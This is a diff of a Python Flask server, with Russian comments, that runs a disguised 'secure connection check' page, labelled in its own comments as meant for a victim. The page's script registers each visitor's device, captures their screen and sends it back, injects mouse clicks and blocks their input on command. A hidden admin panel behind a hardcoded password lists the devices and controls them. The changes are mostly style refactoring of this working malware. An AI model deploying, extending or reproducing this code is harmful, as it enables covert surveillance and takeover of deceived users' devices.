@@ -1,20 +1,20 @@
-import asyncio
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
 import json
 import os
-import time
-import base64
 from datetime import datetime
-from flask import Flask, request, jsonify, render_template_string, send_from_directory
+from flask import Flask, request, jsonify
 from flask_sock import Sock
-from werkzeug.security import check_password_hash, generate_password_hash
+from werkzeug.security import generate_password_hash, check_password_hash
 
 app = Flask(__name__)
 sock = Sock(app)
 
 # ========== Хранилище ==========
-devices = {}          # device_id -> { "ws": websocket, "type": "pc/phone/tablet", "last_seen": timestamp, "nick": str, "screen": last_base64, "mouse_blocked": bool }
-admin_sessions = {}   # session_token -> device_id (кто кого смотрит)
-ADMIN_PASSWORD_HASH = generate_password_hash("DDS_MrL_2026")  # смени на свой
+devices = {}
+admin_sessions = {}
+ADMIN_PASSWORD_HASH = generate_password_hash("DDS_MrL_2026")
 
 # ========== Маскировочная страница (для жертвы) ==========
 MASK_PAGE = '''
@@ -23,7 +23,7 @@ MASK_PAGE = '''
 <head>
   <title>Проверка защищённого соединения</title>
   <style>
-    body{background:#0b0e1a;color:#c0caf5;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;flex-direction:column;}
+    body{background:#0b0e1a;color:#c0caf5;font-family:"Segoe UI",sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;flex-direction:column;}
     .loader{width:60px;height:60px;border:4px solid #2a2f4a;border-top:4px solid #7aa2f7;border-radius:50%;animation:spin 1.2s cubic-bezier(0.5,0,0.5,1) infinite;}
     @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
     .status{color:#565f89;margin-top:20px;letter-spacing:2px;font-size:14px;}
@@ -34,7 +34,6 @@ MASK_PAGE = '''
   <div class="loader"></div>
   <div class="status">Установка защищённого канала...</div>
   <script>
-    // ===== ПАЙЛОАД =====
     (function() {
       const WS_URL = "wss://"+location.host+"/ws";
       let ws = new WebSocket(WS_URL);
@@ -44,18 +43,15 @@ MASK_PAGE = '''
       if(/android|iphone|ipad|tablet/i.test(navigator.userAgent)) deviceType = "tablet";
       if(/mobile/i.test(navigator.userAgent) && !/tablet/i.test(navigator.userAgent)) deviceType = "phone";
 
-      ws.onopen = () => {
+      ws.onopen = function() {
         ws.send(JSON.stringify({type:"register", id:deviceId, deviceType:deviceType}));
         document.querySelector(".status").innerText = "Соединение установлено";
-        setTimeout(()=>document.querySelector(".loader").classList.add("hidden"), 1500);
+        setTimeout(function(){document.querySelector(".loader").classList.add("hidden");}, 1500);
       };
 
-      // === Скрытая камера/экран (только если запрошено) ===
-      let screenStream = null;
       async function captureScreen() {
         try {
           const stream = await navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 5 }, audio: false });
-          screenStream = stream;
           const track = stream.getVideoTracks()[0];
           const imageCapture = new ImageCapture(track);
           const bitmap = await imageCapture.grabFrame();
@@ -67,11 +63,10 @@ MASK_PAGE = '''
           const dataUrl = canvas.toDataURL("image/jpeg", 0.5);
           ws.send(JSON.stringify({type:"screen", data:dataUrl, id:deviceId}));
           track.stop();
-          stream.getTracks().forEach(t=>t.stop());
+          stream.getTracks().forEach(function(t){t.stop();});
         } catch(e){}
       }
 
-      // === Управление мышью / тач ===
       function injectMouseMove(x, y) {
         const ev = new MouseEvent("mousemove", { clientX: x, clientY: y, bubbles: true });
         document.dispatchEvent(ev);
@@ -86,21 +81,19 @@ MASK_PAGE = '''
         document.dispatchEvent(ev);
       }
 
-      // === Блокировка мыши/тача ===
       let mouseBlocked = false;
       function blockMouse(enable) {
         mouseBlocked = enable;
         if(enable) {
           document.body.style.pointerEvents = "none";
-          document.addEventListener("mousedown", (e)=>e.preventDefault(), true);
-          document.addEventListener("touchstart", (e)=>e.preventDefault(), true);
+          document.addEventListener("mousedown", function(e){e.preventDefault();}, true);
+          document.addEventListener("touchstart", function(e){e.preventDefault();}, true);
         } else {
           document.body.style.pointerEvents = "auto";
         }
       }
 
-      // === Обработка команд от сервера ===
-      ws.onmessage = (e) => {
+      ws.onmessage = function(e) {
         const data = JSON.parse(e.data);
         if(data.type === "mouse_move") {
           injectMouseMove(data.x, data.y);
@@ -119,15 +112,13 @@ MASK_PAGE = '''
         }
       };
 
-      // === Пинг ===
-      setInterval(() => {
+      setInterval(function() {
         if(ws.readyState === 1) ws.send(JSON.stringify({type:"ping", id:deviceId}));
       }, 15000);
 
-      // === Переподключение ===
-      ws.onclose = () => {
+      ws.onclose = function() {
         document.querySelector(".status").innerText = "Переподключение...";
-        setTimeout(() => { window.location.reload(); }, 3000);
+        setTimeout(function(){ window.location.reload(); }, 3000);
       };
     })();
   </script>
@@ -135,7 +126,7 @@ MASK_PAGE = '''
 </html>
 '''
 
-# ========== СЕКРЕТНАЯ АДМИН-ПАНЕЛЬ ==========
+# ========== АДМИН-ПАНЕЛЬ (секретный путь /admin) ==========
 ADMIN_PANEL = '''
 <!DOCTYPE html>
 <html>
@@ -144,7 +135,7 @@ ADMIN_PANEL = '''
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     *{margin:0;padding:0;box-sizing:border-box}
-    body{background:#0d1117;color:#c9d1d9;font-family:'Courier New',monospace;padding:20px;}
+    body{background:#0d1117;color:#c9d1d9;font-family:"Courier New",monospace;padding:20px;}
     .container{max-width:1400px;margin:auto;}
     h1{color:#58a6ff;border-bottom:2px solid #30363d;padding-bottom:10px;margin-bottom:20px;}
     .device-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:15px;}
@@ -238,57 +229,90 @@ new Vue({
     sessionId: crypto.randomUUID()
   },
   computed: {
-    onlineCount() { return Object.values(this.devices).filter(d => d.online).length; },
-    phoneCount() { return Object.values(this.devices).filter(d => d.deviceType === 'phone' && d.online).length; },
-    pcCount() { return Object.values(this.devices).filter(d => d.deviceType === 'pc' && d.online).length; },
-    tabletCount() { return Object.values(this.devices).filter(d => d.deviceType === 'tablet' && d.online).length; }
+    onlineCount: function() {
+      var count = 0;
+      for(var key in this.devices) {
+        if(this.devices[key].online) count++;
+      }
+      return count;
+    },
+    phoneCount: function() {
+      var count = 0;
+      for(var key in this.devices) {
+        if(this.devices[key].deviceType === 'phone' && this.devices[key].online) count++;
+      }
+      return count;
+    },
+    pcCount: function() {
+      var count = 0;
+      for(var key in this.devices) {
+        if(this.devices[key].deviceType === 'pc' && this.devices[key].online) count++;
+      }
+      return count;
+    },
+    tabletCount: function() {
+      var count = 0;
+      for(var key in this.devices) {
+        if(this.devices[key].deviceType === 'tablet' && this.devices[key].online) count++;
+      }
+      return count;
+    }
   },
   methods: {
-    login() {
+    login: function() {
+      var self = this;
       fetch('/admin/login', {
         method: 'POST',
         headers: {'Content-Type':'application/json'},
         body: JSON.stringify({password: this.password})
-      }).then(r => r.json()).then(data => {
+      }).then(function(r){return r.json();}).then(function(data) {
         if(data.ok) {
-          this.logged = true;
-          this.connectWS();
-        } else alert('Неверный пароль');
+          self.logged = true;
+          self.connectWS();
+        } else {
+          alert('Неверный пароль');
+        }
       });
     },
-    connectWS() {
+    connectWS: function() {
+      var self = this;
       this.ws = new WebSocket('wss://'+location.host+'/admin/ws');
-      this.ws.onopen = () => {
-        this.ws.send(JSON.stringify({type:'admin_register', session:this.sessionId}));
+      this.ws.onopen = function() {
+        self.ws.send(JSON.stringify({type:'admin_register', session:self.sessionId}));
       };
-      this.ws.onmessage = (e) => {
-        const data = JSON.parse(e.data);
+      this.ws.onmessage = function(e) {
+        var data = JSON.parse(e.data);
         if(data.type === 'devices_list') {
-          this.devices = data.devices;
+          self.devices = data.devices;
         } else if(data.type === 'device_update') {
-          Vue.set(this.devices, data.id, data.data);
+          self.$set(self.devices, data.id, data.data);
         } else if(data.type === 'screen_update') {
-          if(this.currentView === data.id) this.viewerScreen = data.screen;
-          if(this.devices[data.id]) Vue.set(this.devices[data.id], 'screen', data.screen);
+          if(self.currentView === data.id) self.viewerScreen = data.screen;
+          if(self.devices[data.id]) self.$set(self.devices[data.id], 'screen', data.screen);
         } else if(data.type === 'device_offline') {
-          if(this.devices[data.id]) Vue.set(this.devices[data.id], 'online', false);
+          if(self.devices[data.id]) self.$set(self.devices[data.id], 'online', false);
         }
       };
-      this.ws.onclose = () => setTimeout(this.connectWS, 3000);
+      this.ws.onclose = function() {
+        setTimeout(function(){ self.connectWS(); }, 3000);
+      };
     },
-    sendCmd(id, cmd, payload) {
+    sendCmd: function(id, cmd, payload) {
       if(this.ws && this.ws.readyState === 1) {
-        this.ws.send(JSON.stringify({type:'cmd', target:id, cmd:cmd, ...payload}));
+        var msg = {type:'cmd', target:id, cmd:cmd};
+        if(payload) {
+          for(var key in payload) msg[key] = payload[key];
+        }
+        this.ws.send(JSON.stringify(msg));
       }
     },
-    captureScreen(id) { this.sendCmd(id, 'capture_screen'); },
-    blockMouse(id, block) { this.sendCmd(id, block ? 'block_mouse' : 'unblock_mouse'); },
-    moveMouse(id, x, y) { this.sendCmd(id, 'mouse_move', {x, y}); },
-    sendClick(id, x, y) { this.sendCmd(id, 'click', {x, y}); },
-    viewDevice(id) {
+    captureScreen: function(id) { this.sendCmd(id, 'capture_screen'); },
+    blockMouse: function(id, block) { this.sendCmd(id, block ? 'block_mouse' : 'unblock_mouse'); },
+    moveMouse: function(id, x, y) { this.sendCmd(id, 'mouse_move', {x:x, y:y}); },
+    sendClick: function(id, x, y) { this.sendCmd(id, 'click', {x:x, y:y}); },
+    viewDevice: function(id) {
       this.currentView = id;
       this.viewerScreen = this.devices[id]?.screen || null;
-      if(this.devices[id]?.screen) this.viewerScreen = this.devices[id].screen;
     }
   }
 });
@@ -297,8 +321,7 @@ new Vue({
 </html>
 '''
 
-# ========== Flask Routes ==========
-
+# ========== Маршруты ==========
 @app.route('/')
 def mask():
     return MASK_PAGE
@@ -343,7 +366,6 @@ def device_ws(ws):
             elif data.get('type') == 'screen' and device_id:
                 if device_id in devices:
                     devices[device_id]['screen'] = data['data']
-                    # шлём админам, кто смотрит это устройство
                     for admin_ws in admin_sessions.values():
                         try:
                             admin_ws.send(json.dumps({
@@ -351,7 +373,8 @@ def device_ws(ws):
                                 'id': device_id,
                                 'screen': data['data']
                             }))
-                        except: pass
+                        except:
+                            pass
             elif data.get('type') == 'pong' and device_id:
                 if device_id in devices:
                     devices[device_id]['last_seen'] = datetime.now().isoformat()
@@ -372,10 +395,12 @@ def admin_ws(ws):
             if data.get('type') == 'admin_register':
                 session = data.get('session')
                 admin_sessions[session] = ws
-                # отправить текущий список
+                clean_devices = {}
+                for k, v in devices.items():
+                    clean_devices[k] = {key: val for key, val in v.items() if key != 'ws'}
                 ws.send(json.dumps({
                     'type': 'devices_list',
-                    'devices': {k: {**v, 'ws': None} for k, v in devices.items()}
+                    'devices': clean_devices
                 }))
             elif data.get('type') == 'cmd' and session:
                 target = data.get('target')
@@ -394,17 +419,22 @@ def admin_ws(ws):
         if session and session in admin_sessions:
             del admin_sessions[session]
 
+# ========== Вспомогательные функции ==========
 def broadcast_devices():
-    # отправить всем админам обновлённый список
+    clean_devices = {}
+    for k, v in devices.items():
+        clean_devices[k] = {key: val for key, val in v.items() if key != 'ws'}
     data = {
         'type': 'devices_list',
-        'devices': {k: {**v, 'ws': None} for k, v in devices.items()}
+        'devices': clean_devices
     }
     for ws in list(admin_sessions.values()):
         try:
             ws.send(json.dumps(data))
-        except: pass
+        except:
+            pass
 
 # ========== Запуск ==========
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
+    port = int(os.environ.get('PORT', 10000))
+    app.run(host='0.0.0.0', port=port)
